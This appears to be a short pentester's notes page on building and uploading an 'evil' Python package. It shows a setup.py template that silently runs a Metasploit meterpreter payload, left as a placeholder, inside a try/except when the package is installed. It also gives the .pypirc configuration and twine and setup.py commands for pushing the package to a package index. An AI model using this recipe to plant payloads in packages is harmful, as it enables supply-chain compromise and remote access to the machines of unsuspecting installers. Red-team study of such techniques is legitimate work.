
# Create evil package
#python #package #pypi #metasploit 

## Remote upload
### Structure
Payload: [[Metasploit]]
```
.
├── evil
│   ├── evil.py
│   ├── __init__.py
│   └── __main__.py
├── README.md
└── setup.py
```


### Creat dist for package
`python3 setup.py sdist`


## Upload package to an pypiserver
```
pip install twine
twine upload file_name.whl --repository-url https://pip.server_name.com/
```

## Local evil package
TODO might even work remote

### Files

struc:
```
.
├── .pypirc
└── setup.py

```

setup.py:
```
import setuptools

try:
	<meterpreter payload>
except:
    pass

setuptools.setup(
    name="example-pg-evil-1", # Replace with your own username
    version="0.0.1",
    author="sn0b4ll",
    author_email="author@example.com",
    description="A small example package",
    long_description="Muhaha",
    long_description_content_type="python",
    url="https://github.com/pypa/sampleproject",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)
```

.pypirc
```
[distutils]
index-servers = local

[local]
repository: <server>
username: <user>
password: <credential>

```

### Exec
`python3 setup.py sdist register -r local upload -r local`